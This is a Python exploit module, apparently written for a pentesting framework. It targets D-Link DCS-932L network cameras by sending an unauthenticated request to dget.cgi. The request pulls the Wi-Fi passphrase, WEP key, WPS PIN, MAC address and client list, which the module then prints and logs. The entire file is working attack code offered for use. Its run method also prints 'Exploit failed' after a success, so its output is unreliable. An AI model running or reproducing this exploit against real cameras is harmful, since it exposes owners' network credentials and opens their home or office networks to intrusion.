#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Author: 'arvin'
import json
import prettytable
import utils
from template.exploit import BaseExploit


class Exploit(BaseExploit):
    __info__ = {
        'name': 'D-Link DCS 932L Configure Disclosure',
        'description': 'D-Link DCS 932L configure information allow unauthenticated access',
        'reference': ['https://www.exploit-db.com/exploits/39437/'],
    }

    prompt = 'dcs_932l_config_dget'

    def __init__(self):
        super().__init__()
        self.info = None

    def check(self, host, port, timeout):
        url = "http://{}:{}/cgi-bin/dget.cgi?cmd=wifi_AP1_ssid,wifi_AP1_hidden,wifi_AP1_passphrase," \
              "wifi_AP1_passphrase_wep,wifi_AP1_security_mode,wifi_AP1_enable,get_mac_filter_list," \
              "get_mac_filter_switch,get_client_list,get_mac_address,get_wps_dev_pin,get_wps_mode," \
              "get_wps_enable,get_wps_current_time&_=1458458152703" \
              .format(host, port)

        resp, err = self.http_get(self.s, url, timeout)
        if err is None:
            if resp.status_code == 200:
                try:
                    self.info = json.loads(resp.text)
                    if len(self.info):
                        self.print_check_result(True, host)
                        return True  # target is vulnerable
                except ValueError:
                    pass
        self.print_check_result(False, host)
        return False  # target is not vulnerable

    def run(self, host, port, timeout):
        # TODO NOT TESTING
        if self.info is None:
            url = "http://{}:{}/cgi-bin/dget.cgi?cmd=wifi_AP1_ssid,wifi_AP1_hidden,wifi_AP1_passphrase," \
                  "wifi_AP1_passphrase_wep,wifi_AP1_security_mode,wifi_AP1_enable,get_mac_filter_list," \
                  "get_mac_filter_switch,get_client_list,get_mac_address,get_wps_dev_pin,get_wps_mode," \
                  "get_wps_enable,get_wps_current_time&_=1458458152703" \
                .format(host, port)

            resp, err = self.http_get(self.s, url, timeout)
            if err is None:
                if resp.status_code == 200:
                    try:
                        self.info = json.loads(resp.text)
                    except ValueError:
                        pass

        if self.info and len(self.info):
            utils.print_success('Exploit success')
            t = prettytable.PrettyTable()
            t.add_column('Key', list(self.info.keys()))
            t.add_column('Value', list(self.info.values()))
            utils.print_info(t)
            utils.logger.send((host, port, t))

        utils.print_failed('Exploit failed')
